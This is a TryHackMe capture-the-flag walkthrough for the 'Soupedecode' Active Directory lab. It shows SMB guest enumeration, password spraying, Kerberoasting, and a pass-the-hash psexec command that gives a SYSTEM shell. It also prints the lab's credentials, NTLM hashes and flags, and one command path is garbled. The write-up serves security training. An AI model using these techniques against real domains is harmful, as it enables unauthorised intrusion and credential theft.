# Soupedecode - TryHackMe Walkthrough
**Author:** Soupedecode
**Date:** March 3, 2026
**Target IP:** 10.49.143.5

## 1. Reconnaissance
An initial Nmap scan reveals several open ports associated with Active Directory:
- **53/tcp**: DNS
- **88/tcp**: Kerberos
- **135/tcp**: RPC
- **389/636/tcp**: LDAP
- **445/tcp**: SMB
- **3389/tcp**: RDP

**Domain identified:** `SOUPEDECODE.LOCAL`

## 2. Initial Access
The machine allows Guest access to SMB. By performing a RID brute-force or listing users, we identify valid domain accounts. A password spray (username as password) yields valid credentials for:
- **User:** `ybob317`
- **Password:** `ybob317`

### User Flag
Accessing the `Users` share and navigating to the user's desktop:
```bash
smbclient //10.49.143.5/Users -U ybob317%ybob317 -c "get ybob317\Desktop\user.txt -"
```
**User Flag:** `28189316c25dd3c0ad56d44d000d62a8`

## 3. Privilege Escalation (Lateral Movement)
Performing Kerberoasting using `ybob317`'s credentials reveals a hash for the service account `file_svc`.

Cracking the hash with `rockyou.txt` provides the password:
- **User:** `file_svc`
- **Password:** `Password123!!`

## 4. Domain Admin (Root Access)
Using `file_svc`'s credentials, we access the `backup` SMB share and find `backup_extract.txt`. This file contains NTLM hashes for several machine accounts.

One specific account stands out due to its high privileges (Enterprise Admins):
- **Account:** `FileServer$`
- **NTLM Hash:** `e41da7e79a4c76dbd9cf79d1cb325559`

### Root Flag
Using a Pass-the-Hash (PtH) attack with `impacket-psexec`, we gain a SYSTEM shell:
```bash
psexec.py SOUPEDECODE.LOCAL/'FileServer$'@10.49.143.5 -hashes :e41da7e79a4c76dbd9cf79d1cb325559 "cmd.exe /c type C:\Users\Administrator\Desktop
oot.txt"
```
**Root Flag:** `27cb2be302c388d63d27c86bfdd5f56a`
